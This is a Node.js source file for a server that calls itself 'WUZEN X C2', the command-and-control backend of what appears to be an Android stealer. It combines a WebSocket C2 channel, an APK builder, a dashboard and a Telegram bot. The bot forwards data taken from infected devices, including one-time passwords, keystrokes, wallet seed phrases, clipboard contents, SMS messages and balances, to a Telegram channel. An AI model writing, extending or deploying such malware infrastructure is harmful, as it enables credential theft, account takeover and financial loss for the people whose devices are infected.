import express from 'express';
import http from 'http';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';
import { config } from './config.js';
import { setupWebSocket } from './ws.js';
import { ApkBuilder } from './apk-builder.js';
import { WuzenBot } from './bot.js';
import { setupDashboard } from './dashboard.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

const app = express();
const server = http.createServer(app);

// Middleware
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, '..', 'public')));

// API
app.get('/', (req, res) => res.json({ name: 'WUZEN X', version: '2.0.0', status: 'online' }));
app.get('/health', (req, res) => res.json({ ok: true, uptime: process.uptime() }));

// Initialize C2 WebSocket
const c2 = setupWebSocket(server);

// Initialize APK Builder
const apkBuilder = new ApkBuilder();

// Setup Web Dashboard
setupDashboard(app, c2);

// Setup Telegram Bot
const bot = new WuzenBot(c2, apkBuilder);
c2.setBot(bot);

// Wire bot events to channel
bot.on('device_online', (data) => bot.sendToChannel('device_online', data));
bot.on('device_offline', (data) => bot.sendToChannel('device_offline', data));
bot.on('device_otp', (data) => bot.sendToChannel('otp', data));
bot.on('device_keylog', (data) => bot.sendToChannel('keylog', data));
bot.on('device_seed', (data) => bot.sendToChannel('seed', data));
bot.on('device_clipboard', (data) => bot.sendToChannel('clipboard', data));
bot.on('device_crypto', (data) => bot.sendToChannel('crypto', data));
bot.on('device_sms', (data) => bot.sendToChannel('sms', data));
bot.on('device_balance', (data) => bot.sendToChannel('balance', data));

// Launch bot
bot.launch();

// Start server
server.listen(config.port, () => {
  console.log(`⬡ WUZEN X C2 Server running on port ${config.port}`);
  console.log(`🌐 Dashboard: ${config.renderUrl}/dashboard`);
  console.log(`🤖 Bot active: ${!!config.botToken}`);
  console.log(`📢 Channel: ${config.channelId || 'Not configured'}`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down...');
  bot.stop();
  server.close();
  process.exit(0);
});

process.on('SIGINT', () => {
  bot.stop();
  server.close();
  process.exit(0);
});
